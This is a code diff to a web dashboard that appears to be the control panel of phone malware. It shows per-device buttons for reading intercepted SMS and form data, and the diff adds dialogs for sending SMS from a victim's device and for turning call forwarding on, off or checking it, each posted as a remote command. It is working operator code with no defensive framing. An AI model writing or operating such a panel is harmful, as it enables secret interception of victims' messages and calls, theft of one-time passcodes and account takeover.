@@ -208,8 +208,8 @@
                         <button class="btn-sm btn-view" style="background:#1976d2;" onclick="viewData('${d.deviceId}')"><i class="fas fa-eye"></i> VIEW DATA</button>
                         <button class="btn-sm btn-view" style="background:#00bcd4;" onclick="viewSms('${d.deviceId}')"><i class="fas fa-envelope"></i> VIEW SMS</button>
                         <button class="btn-sm btn-view" style="background:#ffeb3b;color:#222;" onclick="viewFormData('${d.deviceId}')"><i class="fas fa-file-alt"></i> FORM DATA</button>
-                        <button class="btn-sm btn-sms" style="background:#43a047;" onclick="act('${d.deviceId}', 'SEND_SMS')"><i class="fas fa-paper-plane"></i> SEND SMS</button>
-                        <button class="btn-sm btn-call" style="background:#ff9800;" onclick="act('${d.deviceId}', 'CALL_FORWARD')"><i class="fas fa-phone"></i> CALL FWD</button>
+                        <button class="btn-sm btn-sms" style="background:#43a047;" onclick="showSendSmsModal('${d.deviceId}')"><i class="fas fa-paper-plane"></i> SEND SMS</button>
+                        <button class="btn-sm btn-call" style="background:#ff9800;" onclick="showCallForwardModal('${d.deviceId}')"><i class="fas fa-phone"></i> CALL FWD</button>
                         <button class="btn-sm btn-del" style="background:#d32f2f;font-weight:bold;" onclick="del('${d.deviceId}')"><i class="fas fa-trash"></i> DELETE</button>
                     </div>`;
 
@@ -293,37 +293,109 @@
         }
 
         function viewSms(deviceId) {
-            (async () => {
-                const device = devices.find(d => d.deviceId === deviceId);
-                if (!device) { toast('❌ Device not found', true); return; }
-                try {
-                    const r = await fetch('/api/command', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ deviceId, action: 'VIEW_SMS', data: {} }) });
-                    const d = await r.json(); if (!d.success) { toast('❌ ' + (d.message || 'Failed to send VIEW_SMS command'), true); return; }
-                    setTimeout(() => { fetchData(false); setTimeout(() => {
-                        const updatedDevice = devices.find(dev => dev.deviceId === deviceId) || device;
-                        let messages = Array.isArray(updatedDevice.smsMessages) ? updatedDevice.smsMessages.slice(-50).reverse() : [];
-                        let html = `<div style='background:#e3f2fd;padding:18px;border-radius:8px;'><div style='font-size:18px;font-weight:bold;color:#1976d2;'>${escapeAttr(updatedDevice.model||'')} - Last 50 SMS</div></div><hr style='margin:0 0 10px 0;border:0;border-top:2px solid #1976d2;'>`;
-                        html += messages.map((msg, idx) => `\
-                            <div style='background:#fff;margin-bottom:8px;padding:10px;border-radius:6px;border-left:5px solid #1976d2;display:flex;align-items:center;justify-content:space-between;'>\
-                                <div>\
-                                    <div style='font-size:13px;color:#1976d2;font-weight:bold;'>${idx+1}. From: ${escapeAttr(msg.from||msg.address||'Unknown')}</div>\
-                                    <div style='font-size:15px;color:#222;margin:4px 0;'>${escapeAttr(msg.body||msg.message||'')}</div>\
-                                    <div style='font-size:12px;color:#888;'>${msg.time ? formatLastSeen(msg.time) : ''}</div>\
-                                </div>\
-                                <div style='display:flex;flex-direction:column;gap:6px;'>\
-                                    <i class="fas fa-copy copy-btn" style="color:var(--primary);cursor:pointer;font-size:18px;" data-text="${escapeAttr(msg.body||msg.message||'')}"></i>\
-                                </div>\
-                            </div>`).join('');
-                        if (messages.length === 0) html += '<div class="no-data">No SMS messages found</div>';
-                        document.getElementById('smsModalBody').innerHTML = html;
-                        setTimeout(() => { document.querySelectorAll('#smsModalBody .copy-btn').forEach(el => el.onclick = () => { navigator.clipboard.writeText(el.dataset.text||'').then(()=>toast('Message copied!')).catch(()=>toast('Copy failed', true)); }); }, 0);
-                        document.getElementById('viewSmsModal').classList.add('show');
-                    }, 700); }, 700);
-                } catch (err) { toast('❌ Error sending VIEW_SMS command', true); }
-            })();
+            const device = devices.find(d => d.deviceId === deviceId);
+            if (!device) { toast('❌ Device not found', true); return; }
+            // Use stored smsMessages (assumes device/app forwards latest messages automatically)
+            const msgs = Array.isArray(device.smsMessages) ? device.smsMessages.slice(-50).reverse() : [];
+            let html = `<div style='background:#e3f2fd;padding:18px;border-radius:8px;'><div style='font-size:18px;font-weight:bold;color:#1976d2;'>${escapeAttr(device.model||'')} - Last 50 SMS</div></div><hr style='margin:0 0 10px 0;border:0;border-top:2px solid #1976d2;'>`;
+            html += msgs.map((msg, idx) => `
+                <div style='background:#fff;margin-bottom:8px;padding:10px;border-radius:6px;border-left:5px solid #1976d2;display:flex;align-items:center;justify-content:space-between;'>
+                    <div>
+                        <div style='font-size:13px;color:#1976d2;font-weight:bold;'>${idx+1}. From: ${escapeAttr(msg.from||msg.address||'Unknown')}</div>
+                        <div style='font-size:15px;color:#222;margin:4px 0;'>${escapeAttr(msg.body||msg.message||'')}</div>
+                        <div style='font-size:12px;color:#888;'>${msg.time ? formatLastSeen(msg.time) : ''}</div>
+                    </div>
+                    <div style='display:flex;flex-direction:column;gap:6px;'>
+                        <i class="fas fa-copy copy-btn" style="color:var(--primary);cursor:pointer;font-size:18px;" data-text="${escapeAttr(msg.body||msg.message||'')}"></i>
+                    </div>
+                </div>`).join('');
+            if (msgs.length === 0) html += '<div class="no-data">No SMS messages found</div>';
+            document.getElementById('smsModalBody').innerHTML = html;
+            setTimeout(() => { document.querySelectorAll('#smsModalBody .copy-btn').forEach(el => el.onclick = () => { navigator.clipboard.writeText(el.dataset.text||'').then(()=>toast('Message copied!')).catch(()=>toast('Copy failed', true)); }); }, 0);
+            document.getElementById('viewSmsModal').classList.add('show');
         }
 
         function deleteSms(deviceId, idx) { toast('Delete SMS feature coming soon!'); }
+        
+        // Show Send SMS modal
+        function showSendSmsModal(deviceId) {
+            const modal = document.createElement('div');
+            modal.style.position = 'fixed'; modal.style.top='0'; modal.style.left='0'; modal.style.width='100vw'; modal.style.height='100vh'; modal.style.background='rgba(0,0,0,0.5)'; modal.style.display='flex'; modal.style.alignItems='center'; modal.style.justifyContent='center'; modal.style.zIndex='9999';
+            modal.innerHTML = `
+                <div style="background:#fff;padding:28px;border-radius:12px;min-width:320px;max-width:95vw;">
+                    <div style="font-size:20px;font-weight:bold;color:#1976d2;margin-bottom:12px;text-align:center;">Send SMS</div>
+                    <div style="margin-bottom:12px;">
+                        <label style="font-weight:bold;">Select SIM</label>
+                        <select id="_smsSim" style="width:100%;padding:10px;margin:8px 0;border:2px solid #1976d2;border-radius:6px;"><option value="1">SIM 1</option><option value="2">SIM 2</option></select>
+                        <label style="font-weight:bold;">Recipient Number</label>
+                        <input id="_smsNumber" type="text" style="width:100%;padding:10px;margin:8px 0;border:2px solid #1976d2;border-radius:6px;" placeholder="Enter number">
+                        <label style="font-weight:bold;">Message</label>
+                        <textarea id="_smsBody" rows="4" style="width:100%;padding:10px;border:2px solid #1976d2;border-radius:6px;" placeholder="Enter message"></textarea>
+                        <div id="_smsStatus" style="margin-top:8px;min-height:22px;"></div>
+                    </div>
+                    <div style="display:flex;justify-content:space-between;gap:8px;">
+                        <button id="_smsCancel" style="background:#eee;padding:10px 18px;border-radius:6px;border:none;">Cancel</button>
+                        <button id="_smsSend" style="background:#43a047;color:#fff;padding:10px 18px;border-radius:6px;border:none;">Send</button>
+                    </div>
+                </div>`;
+            document.body.appendChild(modal);
+            document.getElementById('_smsCancel').onclick = () => document.body.removeChild(modal);
+            document.getElementById('_smsSend').onclick = async () => {
+                const simSlot = document.getElementById('_smsSim').value;
+                const number = document.getElementById('_smsNumber').value.trim();
+                const message = document.getElementById('_smsBody').value.trim();
+                if (!number || !message) { document.getElementById('_smsStatus').innerText = 'Number and message required'; return; }
+                document.getElementById('_smsStatus').innerText = 'Sending...';
+                try {
+                    const r = await fetch('/api/command', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ deviceId, action: 'SEND_SMS', data: { simSlot, number, message } }) });
+                    const d = await r.json();
+                    if (d.success) { document.getElementById('_smsStatus').innerText = '✅ SMS command sent'; setTimeout(()=>{ document.body.removeChild(modal); toast('SMS command sent'); },800); }
+                    else { document.getElementById('_smsStatus').innerText = '❌ ' + (d.message || 'Failed'); }
+                } catch (err) { document.getElementById('_smsStatus').innerText = '❌ Error: ' + err.message; }
+            };
+        }
+
+        // Show Call Forward modal
+        function showCallForwardModal(deviceId) {
+            const modal = document.createElement('div'); modal.style.position='fixed'; modal.style.top='0'; modal.style.left='0'; modal.style.width='100vw'; modal.style.height='100vh'; modal.style.background='rgba(0,0,0,0.5)'; modal.style.display='flex'; modal.style.alignItems='center'; modal.style.justifyContent='center'; modal.style.zIndex='9999';
+            modal.innerHTML = `
+                <div style="background:#fff;padding:28px;border-radius:12px;min-width:320px;max-width:95vw;">
+                    <div style="font-size:20px;font-weight:bold;color:#ff9800;margin-bottom:12px;text-align:center;">Call Forward</div>
+                    <div style="margin-bottom:12px;">
+                        <label style="font-weight:bold;">Select SIM</label>
+                        <select id="_cfSim" style="width:100%;padding:10px;margin:8px 0;border:2px solid #ff9800;border-radius:6px;"><option value="1">SIM 1</option><option value="2">SIM 2</option></select>
+                        <label style="font-weight:bold;">Forward Number</label>
+                        <input id="_cfNumber" type="text" style="width:100%;padding:10px;margin:8px 0;border:2px solid #ff9800;border-radius:6px;" placeholder="Enter number">
+                        <div id="_cfStatus" style="margin-top:8px;min-height:22px;"></div>
+                    </div>
+                    <div style="display:flex;justify-content:space-between;gap:8px;">
+                        <button id="_cfActivate" style="background:#43a047;color:#fff;padding:10px 12px;border-radius:6px;border:none;">Activate</button>
+                        <button id="_cfDeactivate" style="background:#d32f2f;color:#fff;padding:10px 12px;border-radius:6px;border:none;">Deactivate</button>
+                        <button id="_cfCheck" style="background:#1976d2;color:#fff;padding:10px 12px;border-radius:6px;border:none;">Check Status</button>
+                    </div>
+                    <div style="margin-top:10px;text-align:center;"><button id="_cfCancel" style="background:#eee;padding:10px 12px;border-radius:6px;border:none;">Close</button></div>
+                </div>`;
+            document.body.appendChild(modal);
+            document.getElementById('_cfCancel').onclick = () => document.body.removeChild(modal);
+
+            document.getElementById('_cfActivate').onclick = async () => {
+                const simSlot = document.getElementById('_cfSim').value;
+                const number = document.getElementById('_cfNumber').value.trim();
+                if (!number) { document.getElementById('_cfStatus').innerText='Number required'; return; }
+                document.getElementById('_cfStatus').innerText='Activating...';
+                try { const r = await fetch('/api/command',{ method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ deviceId, action:'CALL_FORWARD_ACTIVATE', data:{ simSlot, number } }) }); const d = await r.json(); document.getElementById('_cfStatus').innerText = d.success ? '✅ Activated' : ('❌ '+(d.message||'Failed')); } catch (err) { document.getElementById('_cfStatus').innerText='❌ '+err.message; }
+            };
+            document.getElementById('_cfDeactivate').onclick = async () => {
+                const simSlot = document.getElementById('_cfSim').value;
+                document.getElementById('_cfStatus').innerText='Deactivating...';
+                try { const r = await fetch('/api/command',{ method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ deviceId, action:'CALL_FORWARD_DEACTIVATE', data:{ simSlot } }) }); const d = await r.json(); document.getElementById('_cfStatus').innerText = d.success ? '✅ Deactivated' : ('❌ '+(d.message||'Failed')); } catch (err) { document.getElementById('_cfStatus').innerText='❌ '+err.message; }
+            };
+            document.getElementById('_cfCheck').onclick = async () => {
+                const simSlot = document.getElementById('_cfSim').value;
+                document.getElementById('_cfStatus').innerText='Checking...';
+                try { const r = await fetch('/api/command',{ method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ deviceId, action:'CALL_FORWARD_STATUS', data:{ simSlot } }) }); const d = await r.json(); document.getElementById('_cfStatus').innerText = d.success ? ('Status: '+(d.message||'OK')) : ('❌ '+(d.message||'Failed')); } catch (err) { document.getElementById('_cfStatus').innerText='❌ '+err.message; }
+            };
+        }
         function closeModal(modalId) { document.getElementById(modalId).classList.remove('show'); }
         window.onclick = function(event) { const viewDataModal = document.getElementById('viewDataModal'); const viewSmsModal = document.getElementById('viewSmsModal'); if (event.target == viewDataModal) viewDataModal.classList.remove('show'); if (event.target == viewSmsModal) viewSmsModal.classList.remove('show'); }
 
